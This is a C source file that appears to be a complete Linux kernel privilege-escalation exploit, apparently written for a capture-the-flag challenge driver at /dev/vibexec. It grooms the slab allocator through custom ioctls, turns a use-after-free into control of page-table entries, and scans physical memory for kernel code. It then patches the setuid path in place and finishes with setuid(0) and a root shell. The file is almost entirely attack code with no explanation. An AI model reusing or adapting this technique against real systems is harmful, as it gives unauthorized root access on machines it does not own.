#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define PTE2V(i) ((unsigned long long)(i) << 12)
#define PMD2V(i) ((unsigned long long)(i) << 21)
#define PUD2V(i) ((unsigned long long)(i) << 30)
#define PGD2V(i) ((unsigned long long)(i) << 39)

#define V2PTE(i) (((unsigned long long)(i) >> 12) & 0x1ff)
#define V2PMD(i) (((unsigned long long)(i) >> 21) & 0x1ff)
#define V2PUD(i) (((unsigned long long)(i) >> 30) & 0x1ff)
#define V2PGD(i) (((unsigned long long)(i) >> 39) & 0x1ff)

#define PHYS_ENTRY(i) (((unsigned long long)(i) << 12) | 0x8000000000000067)
#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, byte_index)    \
  ((void *)(PGD2V((unsigned long long)(pgd_index)) +                           \
            PUD2V((unsigned long long)(pud_index)) +                           \
            PMD2V((unsigned long long)(pmd_index)) +                           \
            PTE2V((unsigned long long)(pte_index)) +                           \
            (unsigned long long)(byte_index)))
#define PAGE_SIZE 0x1000

#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1) {                                              \
      fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno));          \
      exit(1);                                                                 \
    }                                                                          \
    __res;                                                                     \
  })
#define rep_(i, a_, b_, a, b, ...)                                             \
  for (int i = (a), i##_len = (b); i < i##_len; ++i)
#define rep(i, ...) rep_(i, __VA_ARGS__, __VA_ARGS__, 0, __VA_ARGS__)
#define IOCTL_ADD_ITEM 0xabcd0001
#define IOCTL_REMOVE_ITEM 0xabcd0002
#define IOCTL_SKIP 0xabcd0003
#define IOCTL_EDIT_MEMO 0xabcd0004

#define OBJS_PER_SLAB 64
#define CPU_PARTIAL 122
#define N_PTE 0x8

struct req_item {
  long key;
  char memo[0x28];
};

enum { FLUSH_STAT_INPROGRESS, FLUSH_STAT_DONE };
enum { INPROGRESS, DONE };
#define SPINLOCK(cmp)                                                          \
  while (cmp) {                                                                \
    usleep(10 * 1000);                                                         \
  }
#define BRUTE(i) (PHYS_ENTRY(((i) << 8) + PTE_OFFSET))

static void flush_tlb() {
  short *status;
  void *addr;
  int len = 0x1000;

  status = SYSCHK(mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0));
  addr = SYSCHK(mmap(NULL, len, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0));

  *status = FLUSH_STAT_INPROGRESS;
  if (SYSCHK(fork()) == 0) {
    SYSCHK(munmap(addr, len));
    *status = FLUSH_STAT_DONE;
    sleep(9999);
  }

  SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

  munmap(status, sizeof(short));
}
void assign_to_core(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset) != 0) {
    puts("failed to pin CPU");
    exit(1);
  }
}

int main() {
  int fd = SYSCHK(open("/dev/vibexec", O_RDWR));
  long val = 1;
  long idx;
  char *ptrs[N_PTE * OBJS_PER_SLAB];
  struct req_item req = {0};
  for (int i = 0; i < N_PTE; i++) {
    for (int j = 0; j < OBJS_PER_SLAB; j++) {
      ptrs[i * OBJS_PER_SLAB + j] = SYSCHK(
          // j * 8 + 3: overlaps every list_item.memo
          // 5 * PAGE_SIZE: sizeof(memo) / sizeof(PTE_ENTRY)
          mmap(PTI_TO_VIRT(0xde, 0xad, i, (j * 8) + 3, 0), 5 * PAGE_SIZE,
               PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0));
    }
  }
  *ptrs[0] = 'A';

  // 1.alloc cpu_partial + 1 pages
  puts("[*] alloc cpu_partial + 1 pages");
  rep(i, CPU_PARTIAL + 1) {
    rep(j, OBJS_PER_SLAB) {
      SYSCHK(ioctl(fd, IOCTL_ADD_ITEM, &val));
      val++;
    }
  }

  // 2. alloc objs_per_slab - 1
  puts("[*] alloc objs_per_slab - 1");
  rep(i, OBJS_PER_SLAB - 1) {
    SYSCHK(ioctl(fd, IOCTL_ADD_ITEM, &val));
    val++;
  }

  // 3. alloc a vulnerable object for UAF
  puts("[*] alloc a vulnerable object for UAF");
  long vuln_obj_idx = val++;
  SYSCHK(ioctl(fd, IOCTL_ADD_ITEM, &vuln_obj_idx));

  printf("[*] vuln_obj_idx: %lx\n", vuln_obj_idx);

  // 4. alloc objs_per_slab + 1
  puts("[*] alloc objs_per_slab + 1");
  rep(i, OBJS_PER_SLAB + 1) {
    SYSCHK(ioctl(fd, IOCTL_ADD_ITEM, &val));
    val++;
  }

  // 5. free one object per page
  puts("[*] free one object per page");
  rep(i, CPU_PARTIAL + 1) {
    idx = i * OBJS_PER_SLAB + 1;
    SYSCHK(ioctl(fd, IOCTL_REMOVE_ITEM, &idx));
  }

  // 6. make vuln page empty
  puts("[*] make vuln page empty");
  for (int i = 1; i < OBJS_PER_SLAB; i++) {
    idx = vuln_obj_idx - i;
    SYSCHK(ioctl(fd, IOCTL_REMOVE_ITEM, &idx));
    idx = vuln_obj_idx + i;
    SYSCHK(ioctl(fd, IOCTL_REMOVE_ITEM, &idx));
  }

  idx = 0x1ec0;
  SYSCHK(ioctl(fd, IOCTL_SKIP, &idx));

  // 7. free the vulnerable page
  puts("[*] free the vulnerable page");
  SYSCHK(ioctl(fd, IOCTL_REMOVE_ITEM, &vuln_obj_idx));

  // 8. Reclaim freed page
  puts("[*] recalim the vulnerable page");
  rep(i, N_PTE * OBJS_PER_SLAB) { *(long *)ptrs[i] = 0xdeadbeefcafebabe; }

  // 9. Overwrite PTE and access every physical page
  puts("[*] overwriting PTE");
  rep(i, 0x100 / 5) {
#define PTE_OFFSET 0xa5
#define SETUID_OFF 0x8b8
    unsigned long long buf[5] = {BRUTE(i * 5), BRUTE(i * 5 + 1),
                                 BRUTE(i * 5 + 2), BRUTE(i * 5 + 3),
                                 BRUTE(i * 5 + 4)};
    printf("[*] phys: %llx -> %llx\n", buf[0], buf[4]);
    req.key = 0;
    memcpy(req.memo, buf, 0x28);
    SYSCHK(ioctl(fd, IOCTL_EDIT_MEMO, &req));
    flush_tlb();
    rep(p, N_PTE * OBJS_PER_SLAB) {
      rep(n, 5) {
        char *ptr = ptrs[p] + n * PAGE_SIZE;
        if (*(long *)ptr == 0x3274c1394810c083) {
          ptr[SETUID_OFF] = 0x75;
          goto win;
        }
      }
    }
  }

  puts("[*] Faild to overwrite setuid");
  sleep(99999);
  return 0;

win:
  puts("[*] win!");
  SYSCHK(setuid(0));
  system("/bin/sh");
  sleep(99999);
  return 0;
}
